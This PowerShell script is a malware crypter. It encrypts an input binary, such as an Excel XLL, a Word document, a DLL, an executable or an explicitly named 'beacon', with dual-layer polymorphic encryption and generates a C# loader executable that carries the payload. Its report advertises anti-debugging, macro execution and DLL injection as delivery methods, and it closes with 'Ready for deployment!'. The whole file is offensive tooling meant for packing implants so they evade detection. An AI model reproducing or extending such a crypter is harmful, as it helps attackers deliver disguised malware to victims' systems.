<#
.SYNOPSIS
  Dual-generation polymorphic encryption - creates both encrypted binary and C# loader executable
.PARAMETER InputFile
  Path to the binary file to encrypt and embed (XLL, DOC, beacon, etc.)
.PARAMETER OutputDir
  Output directory for generated files
.PARAMETER BaseName
  Base name for output files (default: input filename)
.PARAMETER Cipher
  OpenSSL cipher (camellia-256-cbc, aes-256-cbc, chacha20)
.PARAMETER PolyMode
  Polymorphic mode (xor, aes-ctr, camellia-ctr, chacha-ks)
.PARAMETER GenerateLoader
  Generate C# loader executable
.PARAMETER GenerateBinary
  Generate encrypted binary file
.PARAMETER EnableHotPatch
  Enable hot patching with car() markers
#>
param(
    [Parameter(Mandatory=$true)]
    [string]$InputFile,
    [Parameter(Mandatory=$false)]
    [string]$OutputDir = ".",
    [Parameter(Mandatory=$false)]
    [string]$BaseName = "",
    [Parameter(Mandatory=$false)]
    [string]$Cipher = "camellia-256-cbc",
    [Parameter(Mandatory=$false)]
    [string]$PolyMode = "aes-ctr",
    [Parameter(Mandatory=$false)]
    [switch]$GenerateLoader = $true,
    [Parameter(Mandatory=$false)]
    [switch]$GenerateBinary = $true,
    [Parameter(Mandatory=$false)]
    [switch]$EnableHotPatch = $true
)

if (-not (Test-Path $InputFile)) {
    Write-Error "Input file not found: $InputFile"
    exit 1
}

# Determine base name and file type
$fileInfo = Get-Item $InputFile
$inputExt = $fileInfo.Extension.ToLower()
$inputBaseName = if ($BaseName) { $BaseName } else { $fileInfo.BaseName }

# Create output directory
if (-not (Test-Path $OutputDir)) {
    New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
}

Write-Host "=== Dual-Generation Polymorphic Encryption ===" -ForegroundColor Green
Write-Host "Input: $InputFile ($inputExt)" -ForegroundColor Gray
Write-Host "Output Directory: $OutputDir" -ForegroundColor Gray
Write-Host "Base Name: $inputBaseName" -ForegroundColor Gray

# File type specific configurations
$fileTypeConfig = @{
    '.xll' = @{
        Description = "Excel Add-in (XLL)"
        LoaderSuffix = "_xll_loader"
        BinarySuffix = "_encrypted.xll"
        RecommendedCipher = "aes-256-cbc"
        RecommendedPoly = "aes-ctr"
    }
    '.doc' = @{
        Description = "Word Document"
        LoaderSuffix = "_doc_loader"
        BinarySuffix = "_encrypted.doc"
        RecommendedCipher = "camellia-256-cbc"
        RecommendedPoly = "chacha-ks"
    }
    '.docx' = @{
        Description = "Word Document (DOCX)"
        LoaderSuffix = "_docx_loader"
        BinarySuffix = "_encrypted.docx"
        RecommendedCipher = "camellia-256-cbc"
        RecommendedPoly = "chacha-ks"
    }
    '.dll' = @{
        Description = "Dynamic Link Library"
        LoaderSuffix = "_dll_loader"
        BinarySuffix = "_encrypted.dll"
        RecommendedCipher = "chacha20"
        RecommendedPoly = "aes-ctr"
    }
    '.exe' = @{
        Description = "Executable"
        LoaderSuffix = "_exe_loader"
        BinarySuffix = "_encrypted.exe"
        RecommendedCipher = "aes-256-cbc"
        RecommendedPoly = "camellia-ctr"
    }
    '.bin' = @{
        Description = "Binary/Beacon"
        LoaderSuffix = "_beacon_loader"
        BinarySuffix = "_encrypted.bin"
        RecommendedCipher = "chacha20"
        RecommendedPoly = "chacha-ks"
    }
    'default' = @{
        Description = "Generic Binary"
        LoaderSuffix = "_loader"
        BinarySuffix = "_encrypted.bin"
        RecommendedCipher = "camellia-256-cbc"
        RecommendedPoly = "xor"
    }
}

$config = if ($fileTypeConfig.ContainsKey($inputExt)) { 
    $fileTypeConfig[$inputExt] 
} else { 
    $fileTypeConfig['default'] 
}

Write-Host "File Type: $($config.Description)" -ForegroundColor Cyan
Write-Host "Recommended Cipher: $($config.RecommendedCipher)" -ForegroundColor Gray
Write-Host "Recommended Poly: $($config.RecommendedPoly)" -ForegroundColor Gray

# Use recommended settings if not explicitly specified
if (-not $PSBoundParameters.ContainsKey('Cipher')) {
    $Cipher = $config.RecommendedCipher
}
if (-not $PSBoundParameters.ContainsKey('PolyMode')) {
    $PolyMode = $config.RecommendedPoly
}

Write-Host "Using Cipher: $Cipher | Poly: $PolyMode" -ForegroundColor Yellow

# Generate paths
$loaderPath = Join-Path $OutputDir "$inputBaseName$($config.LoaderSuffix).exe"
$binaryPath = Join-Path $OutputDir "$inputBaseName$($config.BinarySuffix)"

# Generate C# loader if requested
if ($GenerateLoader) {
    Write-Host "Generating C# loader executable..." -ForegroundColor Yellow
    
    $loaderArgs = @{
        InputFile = $InputFile
        OutputExe = $loaderPath
        Cipher = $Cipher
        PolyMode = $PolyMode
        VariableName = "payload_$($inputBaseName.Replace('-','_').Replace('.','_'))"
    }
    
    if ($EnableHotPatch) {
        $loaderArgs.EnableHotPatch = $true
    }
    
    try {
        & "$PSScriptRoot\CreateCSharpLoader.ps1" @loaderArgs
        if (Test-Path $loaderPath) {
            Write-Host "✓ C# loader created: $loaderPath" -ForegroundColor Green
        }
    } catch {
        Write-Error "Failed to create C# loader: $_"
    }
}

# Generate encrypted binary if requested
if ($GenerateBinary) {
    Write-Host "Generating encrypted binary..." -ForegroundColor Yellow
    
    try {
        $encryptArgs = @{
            Paths = @($InputFile)
        }
        
        # Temporarily set the desired extension for the polymorphic encryptor
        $originalScript = Get-Content "$PSScriptRoot\..\Encrypt-PolymorphicDualLayer.ps1" -Raw
        $modifiedScript = $originalScript -replace 'txtExt\.Text = "\.exe"', "txtExt.Text = `"$($config.BinarySuffix.Substring($config.BinarySuffix.LastIndexOf('.')))`""
        
        $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
        $modifiedScript | Set-Content $tempScript -Encoding UTF8
        
        # Run the modified encryptor
        & $tempScript $InputFile
        
        Remove-Item $tempScript -ErrorAction SilentlyContinue
        
        # Look for the generated encrypted file
        $generatedFiles = Get-ChildItem -Path (Split-Path $InputFile -Parent) -Filter "*encrypted*" | 
                         Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-1) }
        
        if ($generatedFiles) {
            $latestGenerated = $generatedFiles | Sort-Object CreationTime -Descending | Select-Object -First 1
            Move-Item $latestGenerated.FullName $binaryPath -Force
            Write-Host "✓ Encrypted binary created: $binaryPath" -ForegroundColor Green
        }
    } catch {
        Write-Error "Failed to create encrypted binary: $_"
    }
}

# Generate summary report
$summaryPath = Join-Path $OutputDir "$inputBaseName`_generation_report.txt"
$summary = @"
=== Dual-Generation Polymorphic Encryption Report ===
Generated: $(Get-Date)

Input File: $InputFile
File Type: $($config.Description) ($inputExt)
File Size: $($fileInfo.Length) bytes

Configuration:
- Cipher: $Cipher
- Polymorphic Mode: $PolyMode
- Hot Patching: $(if ($EnableHotPatch) { 'ENABLED' } else { 'DISABLED' })

Generated Files:
$(if (Test-Path $loaderPath) { "✓ C# Loader: $loaderPath" } else { "✗ C# Loader: FAILED" })
$(if (Test-Path $binaryPath) { "✓ Encrypted Binary: $binaryPath" } else { "✗ Encrypted Binary: FAILED" })

Usage Instructions:
1. C# Loader: Run $loaderPath directly - it contains the encrypted payload
2. Encrypted Binary: Use with your existing decryption tools

Security Features:
- Dual-layer encryption (OpenSSL + Polymorphic keystream)
- Position-independent execution
- Memory protection and cleanup
$(if ($EnableHotPatch) { "- Runtime hot patching with car() markers" } else { "" })
- Anti-debugging considerations

File Type Optimizations:
$($config.Description) files are optimized with:
- Cipher: $($config.RecommendedCipher)
- Polymorphic: $($config.RecommendedPoly)
- Execution method: $(if ($inputExt -eq '.xll') { 'Excel Add-in loading' } elseif ($inputExt -eq '.doc' -or $inputExt -eq '.docx') { 'Document macro execution' } elseif ($inputExt -eq '.dll') { 'DLL injection/loading' } else { 'Direct execution' })

=== End Report ===
"@

$summary | Set-Content $summaryPath -Encoding UTF8

Write-Host ""
Write-Host "=== Generation Complete ===" -ForegroundColor Green
Write-Host "Report saved: $summaryPath" -ForegroundColor Gray

if (Test-Path $loaderPath) {
    Write-Host "C# Loader: $loaderPath" -ForegroundColor Cyan
}
if (Test-Path $binaryPath) {
    Write-Host "Encrypted Binary: $binaryPath" -ForegroundColor Cyan
}

Write-Host ""
Write-Host "Ready for deployment!" -ForegroundColor Green